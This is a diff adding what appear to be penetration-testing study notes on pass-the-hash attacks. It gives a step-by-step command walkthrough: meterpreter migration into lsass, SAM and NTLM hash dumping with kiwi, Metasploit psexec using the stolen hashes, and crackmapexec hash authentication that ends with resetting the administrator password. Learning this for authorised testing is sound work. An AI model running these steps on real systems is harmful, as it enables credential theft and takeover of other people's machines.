@@ -1,0 +1,40 @@
+Pass-the-hash is an exploit technique that involves capturing or harvesting NTLM hashes or clear-text passwords and utilizing them to auth with the target legitimately.
+
+We can use multiple tools to faciliate a Pass-The-Hash attack:
+  Metasploit PsExec module
+  Crackmapexec
+  
+This technique will allow us to obtain access to the target system via legit creds as opposed to obtaining access via service exploit, this sets us up for a form of persistence if that service exploit ends up being patched.
+
+-----------------------------------Exploit-------------------------------------
+
+**get access to the host by whatever means you end up finding, in this example it will be badblue exploit**
+
+**now that you have a meterpreter session**
+pgrep lsass
+migrate 780 *whatever the lsass session is**
+getuid
+load kiwi
+lsa_dump_sam
+**now you have the administrator NTLM hash and other account hashes**
+**to perform pass the hash attack with metasploit PsExec module you need the NTLM AND LM hash**
+hashdump (this will give information in this format SID:LM:NTLM)
+ctrl+z (this will background the meterpreter session)
+search psexec (look for exploit/windows/smb/psexec)
+**set port, host, and authentication credentials**
+set SMBUser <username>
+set SMBPass <LM:NTLM>
+set target Command (if you dont get a meterpreter session, try different targets by using 'set target')
+run
+**another meterpreter session should now open**
+getuid (NT AUTHORITY\SYSTEM)
+
+-----------------------------------crackmapexec------------------------------
+crackmapexec smb <ip> -u Administrator -H "<NTLM>"
+**this should now give you access**
+-x "ipconfig" (you can now execute commands)
+-x "whoami"
+-x "net user administrator password123"
+-x "net user"
+(these are just a few commands you can run as an example)
+
